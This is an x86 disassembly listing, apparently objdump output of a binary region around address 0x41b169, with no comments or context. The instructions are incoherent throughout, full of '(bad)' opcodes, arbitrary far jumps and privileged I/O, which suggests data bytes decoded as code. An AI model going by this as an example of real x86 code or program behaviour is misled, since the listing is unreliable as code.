  41b169:	mov    BYTE PTR [eax+0x29],al
  41b16c:	mov    bh,0xa8
  41b16e:	inc    eax
  41b16f:	fisttp WORD PTR [ebp-0x37]
  41b172:	and    eax,0xe312975d
  41b177:	js     0x41b1dc
  41b179:	dec    edi
  41b17a:	ja     0x41b194
  41b17c:	push   edi
  41b17d:	cld    
  41b17e:	adc    BYTE PTR [ebp-0x60b9dd40],0xf8
  41b185:	mov    esp,0xa83064b4
  41b18a:	(bad)  
  41b18b:	xor    ecx,DWORD PTR [esi-0x5fda6ecf]
  41b191:	ins    DWORD PTR es:[edi],dx
  41b192:	les    ebx,FWORD PTR [eax+0x78ba2491]
  41b198:	adc    ecx,edx
  41b19a:	std    
  41b19b:	push   ds
  41b19c:	(bad)  
  41b19d:	fild   WORD PTR [edx-0x23]
  41b1a0:	add    ebp,DWORD PTR [eax+0x74]
  41b1a3:	cmp    eax,0xb66d1395
  41b1a8:	enter  0xc20d,0x4
  41b1ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1ad:	or     cl,dl
  41b1af:	fidiv  WORD PTR [esi+ecx*1+0x74d8b970]
  41b1b6:	test   DWORD PTR [ecx+0x5d],esp
  41b1b9:	scas   eax,DWORD PTR es:[edi]
  41b1ba:	ss pop ebx
  41b1bc:	loope  0x41b1d6
  41b1be:	sar    DWORD PTR [ecx+0x27],1
  41b1c1:	cmp    ch,BYTE PTR [edi+0x1e]
  41b1c4:	aas    
  41b1c5:	(bad)
  41b1c9:	pop    edi
  41b1ca:	jmp    0x3630:0xffbbe7d1
  41b1d1:	sbb    DWORD PTR [edx-0x1b],ecx
  41b1d4:	add    BYTE PTR [eax],dl
  41b1d6:	or     eax,0x9a184815
  41b1db:	push   ss
  41b1dc:	and    edi,ecx
  41b1de:	dec    esi
  41b1df:	hlt    
  41b1e0:	xchg   esi,eax
  41b1e1:	xchg   DWORD PTR ds:0xc5c2610d,edx
  41b1e7:	jle    0x41b22f
  41b1e9:	fild   QWORD PTR [eax+0x54d930b4]
  41b1ef:	jge    0x41b255
  41b1f1:	lahf   
  41b1f2:	pop    ecx
  41b1f3:	jmp    0xdac:0x2fb594bf
  41b1fa:	adc    dl,dh
  41b1fc:	add    esi,DWORD PTR [ebx-0x78]
  41b1ff:	jp     0x41b25d
  41b201:	xor    DWORD PTR [ebx],edx
  41b203:	mov    esi,0xf3e78b03
  41b208:	fsub   DWORD PTR [ecx-0x64]
  41b20b:	xchg   ebx,eax
  41b20c:	cld    
  41b20d:	loope  0x41b207
  41b20f:	fiadd  DWORD PTR [edi+0x16]
  41b212:	xchg   ebx,eax
  41b213:	push   0x2ceac16c
  41b218:	f2xm1  
  41b21a:	in     al,0xb2
  41b21c:	fcomp  DWORD PTR [ecx]
  41b21e:	scas   al,BYTE PTR es:[edi]
  41b21f:	inc    ebx
  41b220:	mov    ebp,edx
  41b222:	ret    0xda75
  41b225:	call   0xc502:0x1eed7212
  41b22c:	arpl   WORD PTR [ebx+0x2fa9e69a],si
  41b232:	hlt    
  41b233:	mov    ecx,0xee798a2a
  41b238:	push   edi
  41b239:	call   0xa19b0df7
  41b23e:	push   ebp
  41b23f:	test   eax,0xe8935cc6
  41b244:	push   cs
  41b245:	xor    edx,DWORD PTR [edx-0x20]
  41b248:	ins    BYTE PTR es:[edi],dx
  41b249:	jne    0x41b275
  41b24b:	or     eax,0x77afb11e
  41b250:	(bad)  
  41b251:	aaa    
  41b252:	pop    esp
  41b253:	loopne 0x41b2a1
  41b255:	mov    dh,0x5f
  41b257:	push   esp
  41b258:	mov    al,0xdd
  41b25a:	in     eax,dx
  41b25b:	pop    ebp
  41b25c:	jb     0x41b24f
  41b25e:	or     eax,0xd4c2fe65
  41b263:	or     al,BYTE PTR [edx]
  41b265:	sahf   
  41b266:	push   esi
  41b267:	fwait
  41b268:	sub    eax,DWORD PTR [edx-0x2b965149]
  41b26e:	lea    edi,[eax+eax*1-0xe]
  41b272:	xor    eax,0xc9356197
  41b277:	inc    ecx
  41b278:	mov    edi,0x8e7284ec
  41b27d:	push   ebx
  41b27e:	mov    ds:0x300326fb,eax
  41b283:	jb     0x41b2a5
  41b285:	cmp    al,0x38
  41b287:	lods   al,BYTE PTR ds:[esi]
  41b288:	sub    esi,DWORD PTR [eax*8-0x63b260d8]
  41b28f:	and    al,0xda
  41b291:	jmp    0x41b276
  41b293:	or     BYTE PTR [eax+esi*8],al
  41b296:	aaa    
  41b297:	fstp   TBYTE PTR [ebx+0xe]
  41b29a:	mov    esi,ebx
  41b29c:	nop
  41b29d:	nop
  41b29e:	and    ebx,esi
  41b2a0:	aam    0x57
  41b2a2:	out    dx,al
  41b2a3:	add    al,0xa6
  41b2a5:	cli    
  41b2a6:	cmp    eax,DWORD PTR [esi]
  41b2a8:	push   ecx
  41b2a9:	sahf   
  41b2aa:	test   BYTE PTR [ebp+0x767bf6f8],al
  41b2b0:	(bad)  
  41b2b1:	sub    eax,0xc431fea9
  41b2b6:	es loop 0x41b29c
  41b2b9:	rol    BYTE PTR [eax],0x16
  41b2bc:	sbb    BYTE PTR [eax-0x43],dl
  41b2bf:	jne    0x41b2a4
  41b2c1:	push   es
  41b2c2:	aas    
  41b2c3:	shl    ch,cl
  41b2c5:	call   0xecf0:0x8153eaf5
  41b2cc:	mov    edi,0x3e03e014
  41b2d1:	adc    DWORD PTR [esi-0x12f3e2b4],edx
  41b2d7:	xchg   BYTE PTR [ecx+0xa977383],dl
  41b2dd:	and    ecx,ecx
  41b2df:	mov    ds:0x4c87cc59,eax
  41b2e4:	and    dl,BYTE PTR [edx+0x4b]
  41b2e7:	mov    cl,0x1b
  41b2e9:	mov    ebx,0xc5e04a66
  41b2ee:	mov    ecx,0xddc00816
  41b2f3:	or     DWORD PTR [eax+edi*4+0x6b],0x72
  41b2f8:	stos   BYTE PTR es:[edi],al
  41b2f9:	icebp  
  41b2fa:	js     0x41b330
  41b2fc:	das    
  41b2fd:	icebp  
  41b2fe:	ins    DWORD PTR es:[edi],dx
  41b2ff:	jmp    0x83b3:0xe8eb3a8a
  41b306:	add    al,0x33
  41b308:	popf   
  41b309:	inc    ecx
  41b30a:	fst    DWORD PTR [esi+ebp*8]
  41b30d:	add    DWORD PTR [edi],0x2ba968ae
  41b313:	mov    ecx,0x73e00cc1
  41b318:	fsubr  DWORD PTR [ebx+0xa]
  41b31b:	mov    ch,BYTE PTR [edx-0x152ea612]
  41b321:	xchg   edx,eax
  41b322:	mov    bl,BYTE PTR [edi-0x79]
  41b325:	add    bl,dh
  41b327:	jne    0x41b2e3
  41b329:	add    dl,BYTE PTR [edx]
  41b32b:	jle    0x41b343
  41b32d:	jg     0x41b2ee
  41b32f:	mov    dl,0xd1
  41b331:	enter  0x7c98,0x6d
  41b335:	les    ebx,FWORD PTR [ebx+0x0]
  41b338:	pop    esp
  41b339:	test   eax,0x21657099
  41b33e:	add    DWORD PTR [ecx],edx
  41b340:	lahf   
  41b341:	ja     0x41b36a
  41b343:	mov    BYTE PTR [edi+0x15],0x81
  41b347:	or     BYTE PTR [esi],ch
  41b349:	jae    0x41b337
  41b34b:	rcr    BYTE PTR [edx-0x5b],cl
  41b34e:	nop
  41b34f:	cmp    ch,BYTE PTR [ebx]
  41b351:	shl    ah,cl
  41b353:	lods   al,BYTE PTR ds:[esi]
  41b354:	sub    cl,dl
  41b356:	push   cs
  41b357:	mov    ch,0x22
  41b359:	stc    
  41b35a:	sub    bl,BYTE PTR [ebx+0x45]
  41b35d:	ret    0x4ae5
  41b360:	mov    esp,0xa76e4f4e
  41b365:	jmp    FWORD PTR [ebx]
  41b367:	inc    ebx
  41b368:	push   ebx
  41b369:	mov    edi,0xb8db5f03
  41b36e:	ret    0x2a17
  41b371:	push   edi
  41b372:	push   eax
  41b373:	adc    ch,BYTE PTR [esp+edi*4+0x6dd0f817]
  41b37a:	sbb    al,0x87
  41b37c:	adc    DWORD PTR [edi+ebx*2-0x14],ecx
  41b380:	fwait
  41b381:	scas   al,BYTE PTR es:[edi]
  41b382:	dec    esi
  41b383:	cmp    bh,BYTE PTR [esi-0x3]
  41b386:	push   0xffffff8b
  41b388:	aas    
  41b389:	mov    ss,WORD PTR [edi]
  41b38b:	inc    edx
  41b38c:	je     0x41b317
  41b38e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b38f:	sbb    al,0xdc
  41b391:	jmp    0x41b33b
  41b393:	dec    edi
  41b394:	add    edi,esp
  41b396:	clc    
  41b397:	xchg   ecx,eax
  41b398:	sub    al,0x92
  41b39a:	ficomp WORD PTR [edx]
  41b39c:	jb     0x41b3ef
  41b39e:	or     dl,BYTE PTR [ebx+0x4]
  41b3a1:	xor    al,0x8e
  41b3a3:	inc    ebx
  41b3a4:	(bad)  
  41b3a5:	dec    ebp
  41b3a6:	sub    DWORD PTR [edx],edi
  41b3a8:	scas   al,BYTE PTR es:[edi]
  41b3a9:	rol    BYTE PTR [eax],1
  41b3ab:	loop   0x41b3a3
  41b3ad:	add    edi,esi
  41b3af:	xor    DWORD PTR [esi],eax
  41b3b1:	inc    eax
  41b3b2:	push   esp
  41b3b3:	pop    ebp
  41b3b4:	cmp    eax,0x3298118b
  41b3b9:	jg     0x41b38a
  41b3bb:	push   esi
  41b3bc:	mov    ch,0x24
  41b3be:	mov    ah,BYTE PTR [edx-0x6cef3ba6]
  41b3c4:	and    DWORD PTR [eax+0x2],0xfffffff9
  41b3c8:	xor    ch,BYTE PTR [ecx]
  41b3ca:	mov    ebp,0xe64ead2
  41b3cf:	sbb    dl,BYTE PTR [edx-0x76]
  41b3d2:	pop    ds
  41b3d3:	mov    ch,0x79
  41b3d5:	clc    
  41b3d6:	adc    eax,0xd2277a5f
  41b3db:	jne    0x41b3a4
  41b3dd:	das    
  41b3de:	out    0xb6,eax
  41b3e0:	jno    0x41b38f
  41b3e2:	jne    0x41b3be
  41b3e4:	or     dl,0xd6
  41b3e7:	push   ebp
  41b3e8:	arpl   WORD PTR [ecx-0x77bf2022],si
  41b3ee:	cmp    edi,DWORD PTR [edx+0x22423232]
  41b3f4:	mov    eax,ds:0x5bb498cf
  41b3f9:	mov    edx,DWORD PTR [ebx+0x24a84ec7]
  41b3ff:	sahf   
  41b400:	sahf   
  41b401:	(bad)  
  41b402:	mov    al,0xc4
  41b404:	push   edx
  41b405:	sub    DWORD PTR [ebx+0x54],ecx
  41b408:	adc    BYTE PTR [edx+0x36],dh
  41b40b:	push   es
  41b40c:	jmp    0x95eb0e8f
  41b411:	dec    DWORD PTR [esi]
  41b413:	xchg   ebx,eax
  41b414:	rol    BYTE PTR [ecx-0x283e863d],1
  41b41a:	mov    ds:0x3fcb0a28,al
  41b41f:	pop    esi
  41b420:	je     0x41b40c
  41b422:	test   bl,al
  41b424:	dec    esi
  41b425:	xchg   ecx,eax
  41b426:	pop    es
  41b427:	jbe    0x1e953ca2
  41b42d:	jl     0x41b44c
  41b42f:	lods   al,BYTE PTR ds:[esi]
  41b430:	ja     0x41b3b8
  41b432:	jae    0x41b408
  41b434:	(bad)  
  41b435:	mov    ebp,0x37bf3df
  41b43a:	sbb    ecx,eax
  41b43c:	push   es
  41b43d:	sub    esi,eax
  41b43f:	sub    eax,0x285669da
  41b444:	icebp  
  41b445:	xchg   esi,eax
  41b446:	(bad)  
  41b447:	out    0xdd,al
  41b449:	or     ebx,DWORD PTR ds:0x99dc5e70
  41b44f:	push   edx
  41b450:	rol    DWORD PTR [edi-0x4d10b13],1
  41b456:	mov    ah,0x91
  41b458:	test   DWORD PTR [edi+0x54],ebx
  41b45b:	test   edi,esp
  41b45d:	or     DWORD PTR [esi],0x16c8a5af
  41b463:	cmp    DWORD PTR [esi+0xee819],edx
  41b469:	lock mov sp,0x273a
  41b46e:	ret    0x5cba
  41b471:	shl    BYTE PTR [ebx+0x63],1
  41b474:	das    
  41b475:	cmp    eax,0x954c5505
  41b47a:	ja     0x41b4ae
  41b47c:	push   eax
  41b47d:	das    
  41b47e:	and    eax,0x7b041aed
  41b483:	and    BYTE PTR [ecx-0x54556499],al
  41b489:	jo     0x41b441
  41b48b:	fbld   TBYTE PTR [eax-0xb239856]
  41b491:	call   0x58c288e
  41b496:	jg     0x41b498
	...
  41b514:	pop    ebp
  41b515:	add    DWORD PTR [edx+0x7debdeea],0x4880e6b7
  41b51f:	sar    BYTE PTR [edi],cl
  41b521:	sub    bh,ah
  41b523:	les    ecx,FWORD PTR [ecx+0x6b000153]
  41b529:	pop    es
  41b52a:	add    BYTE PTR [eax],al
  41b52c:	jo     0x41b4dc
  41b52e:	xchg   BYTE PTR [esi],bh
  41b530:	inc    eax
  41b531:	cwde   
  41b532:	pop    ss
  41b533:	jle    0x41b526
  41b535:	gs mov dh,0x78
  41b538:	xor    BYTE PTR [eax],dl
  41b53a:	fnstcw WORD PTR fs:[edi-0x53304246]
  41b541:	retf   
  41b542:	and    edi,DWORD PTR [esi]
  41b544:	push   edi
  41b545:	out    dx,eax
  41b546:	clc    
  41b547:	cld    
  41b548:	cmp    ah,BYTE PTR ds:0xc9e5b7f4
  41b54e:	sti    
  41b54f:	xchg   esi,eax
  41b550:	aaa    
  41b551:	mov    dh,0x34
  41b553:	aam    0x8c
  41b555:	in     eax,dx
  41b556:	mov    edx,0x19df3992
  41b55b:	stc    
  41b55c:	inc    esi
  41b55d:	test   dl,cl
  41b55f:	imul   esi,DWORD PTR [edx+0x68166258],0xaf43abd8
  41b569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b56a:	inc    edx
  41b56b:	push   eax
  41b56c:	pusha  
  41b56d:	mov    al,ds:0x7b4cfcba
  41b572:	out    dx,eax
  41b573:	inc    eax
  41b574:	add    edi,ebx
  41b576:	adc    eax,0x3df59eb3
  41b57b:	push   esi
  41b57c:	fwait
  41b57d:	in     al,0x42
  41b57f:	jb     0x41b56d
  41b581:	(bad)  
  41b582:	fisubr DWORD PTR [ecx]
  41b584:	cmp    BYTE PTR [edi+0xf0596e0],al
  41b58a:	or     edi,DWORD PTR [edi+0x18441ca]
  41b590:	ja     0x41b56c
  41b592:	sti    
  41b593:	mov    al,al
  41b595:	xchg   ebp,eax
  41b596:	dec    edx
  41b597:	mov    bh,0x2d
  41b599:	hlt    
  41b59a:	sbb    al,0xe9
  41b59c:	std    
  41b59d:	stos   BYTE PTR es:[edi],al
  41b59e:	fist   WORD PTR [eax-0x76]
  41b5a1:	(bad)  
  41b5a2:	xchg   edi,eax
  41b5a3:	ja     0x41b600
  41b5a5:	jb     0x41b5c4
  41b5a7:	pop    ds
  41b5a8:	sbb    ebp,edx
  41b5aa:	jl     0x41b5da
  41b5ac:	popf   
  41b5ad:	mov    ch,0xb1
  41b5af:	fsubr  DWORD PTR [eax-0x6523c07b]
  41b5b5:	jp     0x41b634
  41b5b7:	sti    
  41b5b8:	jmp    0x7bc2f4d8
  41b5bd:	add    ebp,DWORD PTR [eax-0x4f]
  41b5c0:	inc    eax
  41b5c1:	cld    
  41b5c2:	sub    bl,BYTE PTR ds:0xbb584e34
  41b5c8:	jb     0x41b60e
  41b5ca:	gs push eax
  41b5cc:	mov    ebp,0xcb34c083
  41b5d1:	jne    0x41b61a
  41b5d3:	int    0x6d
  41b5d5:	inc    ecx
  41b5d6:	das    
  41b5d7:	mov    ebx,DWORD PTR [edx-0x4a]
  41b5da:	push   eax
  41b5db:	pop    eax
  41b5dc:	aad    0xa
  41b5de:	lods   al,BYTE PTR ds:[esi]
  41b5df:	jno    0x41b61e
  41b5e1:	add    eax,0x5a4ca74b
  41b5e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5e7:	outs   dx,BYTE PTR cs:[esi]
  41b5e9:	sub    BYTE PTR [ecx-0x6d],cl
  41b5ec:	clc    
  41b5ed:	push   es
  41b5ee:	inc    ecx
  41b5ef:	inc    esp
  41b5f0:	inc    cx
  41b5f2:	mov    ds:0x911cf524,eax
  41b5f7:	jns    0x41b62c
  41b5f9:	fidivr WORD PTR gs:[ecx+0x4ab3926e]
  41b600:	cdq    
  41b601:	push   ebp
  41b602:	pop    edi
  41b603:	fst    QWORD PTR [ebp-0x3e]
  41b606:	arpl   WORD PTR ds:0x17d84ace,cx
  41b60c:	push   ebx
  41b60d:	clc    
  41b60e:	jnp    0x41b5e4
  41b610:	shl    DWORD PTR [ecx+0x19bec3e6],0x30
  41b617:	nop
  41b618:	ja     0x41b5f4
  41b61a:	mov    edi,0x48459f14
  41b61f:	sbb    al,0x82
  41b621:	shl    ebp,1
  41b623:	mov    eax,ds:0xf38c7294
  41b628:	scas   eax,DWORD PTR es:[edi]
  41b629:	pusha  
  41b62a:	outs   dx,DWORD PTR ds:[esi]
  41b62b:	sub    al,0x3e
  41b62d:	stos   BYTE PTR es:[edi],al
  41b62e:	popa   
  41b62f:	cmp    DWORD PTR [edi],edi
  41b631:	fsub   DWORD PTR [edx]
  41b633:	jmp    0x41b69a
  41b635:	(bad)  
  41b636:	push   edi
  41b637:	int3   
  41b638:	mov    eax,ds:0x125cf2f0
  41b63d:	fwait
  41b63e:	(bad)  
  41b63f:	adc    BYTE PTR [esi-0x5e],bl
  41b642:	lds    edx,FWORD PTR [esi-0x366854e9]
  41b648:	inc    esp
  41b649:	dec    eax
  41b64a:	jne    0x41b66a
  41b64c:	or     BYTE PTR [eax],bh
  41b64e:	loope  0x41b677
  41b650:	mov    ds:0x9fdc529c,eax
  41b655:	ins    BYTE PTR es:[edi],dx
  41b656:	fcom   QWORD PTR [edx-0x40]
  41b659:	cmc    
  41b65a:	inc    ebp
  41b65b:	pop    edi
  41b65c:	test   eax,0x1a04dbeb
  41b661:	jns    0x41b6ab
  41b663:	cmp    al,0x85
  41b665:	push   es
  41b666:	sti    
  41b667:	mov    ecx,es
  41b669:	sbb    BYTE PTR [ecx+eiz*2-0x5f],bh
  41b66d:	fst    QWORD PTR [ecx+0x32774ff9]
  41b673:	(bad)  
  41b674:	aam    0x41
  41b676:	xor    DWORD PTR [edi-0x2c],edi
  41b679:	jae    0x41b6a9
  41b67b:	or     BYTE PTR [ecx],al
  41b67d:	(bad)  
  41b67f:	xor    edx,eax
  41b681:	push   esi
  41b682:	xlat   BYTE PTR ds:[ebx]
  41b683:	or     cl,BYTE PTR [esi]
  41b685:	test   BYTE PTR [edx],bl
  41b687:	jno    0x41b64e
  41b689:	push   es
  41b68a:	data16 mov bh,0xb9
  41b68d:	adc    al,0x8c
  41b68f:	add    al,0x2d
  41b691:	jmp    0x5be07a66
  41b696:	cmp    BYTE PTR [ebx+edx*8],al
  41b699:	and    DWORD PTR [esi-0x76],0x5c
  41b69d:	inc    edx
  41b69e:	push   eax
  41b69f:	enter  0x6e0f,0xc2
  41b6a3:	out    0x99,eax
  41b6a5:	hlt    
  41b6a6:	xor    eax,0x7b213838
  41b6ab:	(bad)  
  41b6ac:	stos   DWORD PTR es:[edi],eax
  41b6ad:	cmp    ch,al
  41b6af:	stc    
  41b6b0:	sti    
  41b6b1:	xchg   edx,eax
  41b6b2:	xchg   dh,bh
  41b6b4:	add    ebp,DWORD PTR [ebp+0x488b8031]
  41b6ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6bb:	out    0xb4,al
  41b6bd:	or     ecx,DWORD PTR [edi-0x30a500ed]
  41b6c3:	(bad)  
  41b6c4:	fiadd  WORD PTR [edi-0x5d]
  41b6c7:	mov    dl,0x76
  41b6c9:	push   ss
  41b6ca:	mov    esi,0x74619302
  41b6cf:	jo     0x41b692
  41b6d1:	pop    ecx
  41b6d2:	mov    al,0x8a
  41b6d4:	jnp    0x41b740
  41b6d6:	(bad)  
  41b6d7:	cmp    edi,ebx
  41b6d9:	iret   
  41b6da:	loopne 0x41b680
  41b6dc:	out    dx,al
  41b6dd:	je     0x41b758
  41b6df:	pusha  
  41b6e0:	ja     0x41b721
  41b6e2:	cwde   
  41b6e3:	mov    ch,0x6f
  41b6e5:	(bad)  
  41b6e6:	aam    0x36
  41b6e8:	popf   
  41b6e9:	jle    0x41b68d
  41b6eb:	ins    BYTE PTR es:[edi],dx
  41b6ec:	mov    dl,0xfc
  41b6ee:	adc    DWORD PTR [ebp-0x4d],ecx
  41b6f1:	cli    
  41b6f2:	or     al,0x88
  41b6f4:	sub    edi,edx
  41b6f6:	inc    ecx
  41b6f7:	dec    eax
  41b6f8:	std    
  41b6f9:	jmp    0xf6b7a9c5
  41b6fe:	jge    0x41b6e8
  41b700:	in     al,dx
  41b701:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b702:	sbb    al,0x5e
  41b704:	rcl    esi,cl
  41b706:	jle    0x41b756
  41b708:	mov    cl,0xd8
  41b70a:	or     eax,0xfd8a3563
  41b70f:	jo     0x41b69a
  41b711:	jne    0x41b6df
  41b713:	xor    DWORD PTR gs:[esp+eax*1+0x3b967894],esp
  41b71b:	stc    
  41b71c:	add    edx,DWORD PTR [edx-0x56b1234c]
  41b722:	mov    edx,0x65cc6e16
  41b727:	jmp    0x41b759
  41b729:	stos   BYTE PTR es:[edi],al
  41b72a:	adc    BYTE PTR ds:0xc2dcf453,al
  41b730:	push   esi
  41b731:	mov    ecx,0x81f88cf3
  41b736:	xchg   esp,eax
  41b737:	bnd call 0x489654f1
  41b73d:	mov    bl,0xe1
  41b73f:	jp     0x41b6c3
  41b741:	ss dec ebp
  41b743:	std    
  41b744:	dec    edx
  41b745:	ja     0x41b76e
  41b747:	mov    dh,0x52
  41b749:	add    ah,BYTE PTR [ebx-0x10]
  41b74c:	xor    BYTE PTR [ecx+eax*8],0xc5
  41b750:	xor    eax,0xc2c6f232
  41b755:	enter  0x7b8d,0x7f
  41b759:	rol    DWORD PTR [eax+0x4f9dba08],1
  41b75f:	push   cs
  41b760:	fsub   QWORD PTR [esp+esi*8-0x1f]
  41b764:	sub    ebp,esi
  41b766:	mov    edx,0xdbefdc1c
  41b76b:	outs   dx,DWORD PTR ds:[esi]
  41b76c:	sub    eax,0x650b3de2
  41b771:	mov    eax,ds:0x867aa3fd
  41b776:	lds    ecx,FWORD PTR [eax+0x5dff6f1d]
  41b77c:	push   ebp
  41b77d:	mov    dl,0x6
  41b77f:	jl     0x41b755
  41b781:	xor    edx,eax
  41b783:	jb     0x41b7f1
  41b785:	push   cs
  41b786:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b787:	dec    ebp
  41b788:	jns    0x41b70a
  41b78a:	sub    al,0x91
  41b78c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b78d:	leave  
  41b78e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b78f:	dec    edx
  41b790:	cli    
  41b791:	pop    ds
  41b792:	pop    esi
  41b793:	lahf   
  41b794:	fiadd  DWORD PTR [ebx+ebp*4+0x6e39eda3]
  41b79b:	jge    0x41b804
  41b79d:	lds    esi,FWORD PTR [edx]
  41b79f:	ss inc ecx
  41b7a1:	mov    dl,BYTE PTR [edi-0x78]
  41b7a4:	cmp    DWORD PTR [eax-0xba4ccc3],edi
  41b7aa:	outs   dx,BYTE PTR ds:[esi]
  41b7ab:	ret    
  41b7ac:	fwait
  41b7ad:	mov    edx,0xc3e4e407
  41b7b2:	push   ecx
  41b7b3:	addr16 xchg edx,eax
  41b7b5:	lods   al,BYTE PTR ds:[esi]
  41b7b6:	clc    
  41b7b7:	out    dx,eax
  41b7b8:	or     eax,edx
  41b7ba:	mov    dh,0x2
  41b7bc:	or     edx,0xfffffffb
  41b7bf:	xor    eax,0x381097a9
  41b7c4:	popf   
  41b7c5:	add    BYTE PTR ds:0x9ce87a55,0xac
  41b7cc:	mov    BYTE PTR [eax+0x3e431557],al
  41b7d2:	retf   0xa784
  41b7d5:	mov    al,ds:0x62cd8f78
  41b7da:	or     dh,0x12
  41b7dd:	lods   al,BYTE PTR ds:[esi]
  41b7de:	inc    ebp
  41b7df:	cmp    DWORD PTR [ebp+0x556d373c],ebx
  41b7e5:	fld    TBYTE PTR ds:0xa9b7d559
  41b7eb:	aas    
  41b7ec:	or     BYTE PTR [edi],bh
  41b7ee:	pop    edx
  41b7ef:	hlt    
  41b7f0:	out    0x78,al
  41b7f2:	push   ss
  41b7f3:	pusha  
  41b7f4:	sahf   
  41b7f5:	jns    0x41b789
  41b7f7:	addr16 xchg esp,eax
  41b7f9:	ret    
  41b7fa:	pop    edi
  41b7fb:	retf   
  41b7fc:	add    eax,0x1dbc2e88
  41b801:	mov    bl,0x1b
  41b803:	sub    eax,0x63dbfdf5
  41b808:	push   esi
  41b809:	xor    DWORD PTR [eax],edx
  41b80b:	lahf   
  41b80c:	sub    ebp,DWORD PTR ds:0xfcc3cf42
  41b812:	adc    eax,0xe2c2d88b
  41b817:	or     ah,BYTE PTR [esi-0x52]
  41b81a:	cmp    ecx,DWORD PTR [esi]
  41b81c:	pop    ss
  41b81d:	shr    DWORD PTR [edx+0x63],cl
  41b820:	cmp    bl,BYTE PTR fs:[eax+0x1e]
  41b824:	pop    esi
  41b825:	cmp    ebp,DWORD PTR [edi+0x7ac2c979]
  41b82b:	pushf  
  41b82c:	mov    ebx,0x296c3337
  41b831:	popf   
  41b832:	ss ret 
  41b834:	jmp    0x1ddd:0xcc0ae412
  41b83b:	and    al,bh
  41b83d:	adc    eax,0x4cfbaf5d
  41b842:	int3   
  41b843:	fdiv   QWORD PTR [eax+0x10]
  41b846:	arpl   WORD PTR [esi],cx
  41b848:	pop    edx
  41b849:	mov    dh,0xd7
  41b84b:	push   es
  41b84c:	adc    edi,DWORD PTR [ebx+0x93dc336]
  41b852:	adc    eax,eax
  41b854:	mov    BYTE PTR [eax],0xce
  41b857:	outs   dx,BYTE PTR ds:[esi]
  41b858:	push   0xffffffac
  41b85a:	retf   
  41b85b:	rcl    DWORD PTR [edi+0x44af7de9],1
  41b861:	sti    
  41b862:	retf   
  41b863:	add    eax,DWORD PTR [eax]
  41b865:	stc    
  41b866:	push   ecx
  41b867:	sbb    dl,BYTE PTR [esi+0x57]
  41b86a:	push   esi
  41b86b:	lea    edi,[edi+ecx*1]
  41b86e:	imul   esi,DWORD PTR [edi-0x4f],0x94ff3cfa
  41b875:	mov    bl,0x3f
  41b877:	in     al,dx
  41b878:	jl     0x41b8d5
  41b87a:	xchg   ebp,eax
  41b87b:	jnp    0x41b7ff
  41b87d:	es call 0x48f1dd9a
  41b883:	repz mov ebp,0xb78f8914
  41b889:	push   ss
  41b88a:	aad    0x80
  41b88c:	sar    DWORD PTR gs:[ebp+0x3e],0x60
  41b891:	popf   
  41b892:	ficom  DWORD PTR [ebp+0x77]
  41b895:	add    eax,0x7a66157
  41b89a:	(bad)  
  41b89c:	jns    0x41b840
  41b89e:	adc    ebp,ebp
  41b8a0:	jle    0x41b86f
  41b8a2:	aas    
  41b8a3:	jne    0x41b83b
  41b8a5:	add    ebp,DWORD PTR [ecx+0x50c20a47]
  41b8ab:	repz mov al,0xd3
  41b8ae:	and    bl,BYTE PTR [ecx-0x2]
  41b8b1:	mov    ebp,0x7ddab990
  41b8b6:	xor    ebp,0xffffffeb
  41b8b9:	xchg   edx,eax
  41b8ba:	lock fild DWORD PTR [edi+0x4]
  41b8be:	pop    ecx
  41b8bf:	retf   0xc9ff
  41b8c2:	ja     0x41b8ca
  41b8c4:	mov    esp,0x2b4e855
  41b8c9:	xor    al,0x84
  41b8cb:	fisubr WORD PTR cs:[edx-0x167ecfd]
  41b8d2:	xor    bh,BYTE PTR [eax-0x4c]
  41b8d5:	outs   dx,BYTE PTR ds:[esi]
  41b8d6:	dec    esp
  41b8d7:	outs   dx,BYTE PTR es:[esi]
  41b8d9:	sahf   
  41b8da:	inc    edi
  41b8db:	sub    BYTE PTR [ecx],dl
  41b8dd:	cmp    ah,BYTE PTR [edx+ecx*8+0x4]
  41b8e1:	cmp    eax,0xd66e0f54
  41b8e6:	jno    0x41b8d0
  41b8e8:	cmc    
  41b8e9:	(bad)  
  41b8ea:	mov    eax,0xf4b592be
  41b8ef:	leave  
  41b8f0:	adc    al,0x5e
  41b8f2:	data16 int3 
  41b8f4:	mov    dl,bl
  41b8f6:	jbe    0x41b8b2
  41b8f8:	aas    
  41b8f9:	cmp    al,0xd7
  41b8fb:	fstp   TBYTE PTR [ebx]
  41b8fd:	fadd   QWORD PTR [esi+0x1a]
  41b900:	or     dh,BYTE PTR [edi]
  41b902:	imul   ecx,DWORD PTR [edi],0x317656e7
  41b908:	ins    DWORD PTR es:[edi],dx
  41b909:	mov    ecx,ecx
  41b90b:	sub    cl,cl
  41b90d:	jmp    0xe2db98a4
  41b912:	js     0x41b964
  41b914:	xchg   esp,eax
  41b915:	mov    ah,0x3c
  41b917:	popf   
  41b918:	mov    dl,0x42
  41b91a:	arpl   WORD PTR [ebp+0x62],cx
  41b91d:	dec    ecx
  41b91e:	int3   
  41b91f:	xchg   ecx,eax
  41b920:	cmc    
  41b921:	xchg   ebx,eax
  41b922:	in     eax,dx
  41b923:	pop    esp
  41b924:	fwait
  41b925:	(bad)  
  41b926:	jmp    0x41b9a1
  41b928:	dec    ecx
  41b929:	sbb    eax,0x66fb9cf7
  41b92e:	fisubr DWORD PTR [ebx+0x20]
  41b931:	ss leave 
  41b933:	and    al,0x56
  41b935:	jl     0x41b8e8
  41b937:	add    bh,BYTE PTR [esi]
  41b939:	lods   al,BYTE PTR fs:[esi]
  41b93b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b93c:	lods   al,BYTE PTR ds:[esi]
  41b93d:	xor    eax,0x67ca594f
  41b942:	add    BYTE PTR [ebx-0x59965875],dl
  41b948:	loopne 0x41b911
  41b94a:	in     al,dx
  41b94b:	dec    esp
  41b94c:	inc    ebx
  41b94d:	imul   eax,DWORD PTR [edi+0x0],0x105775ed
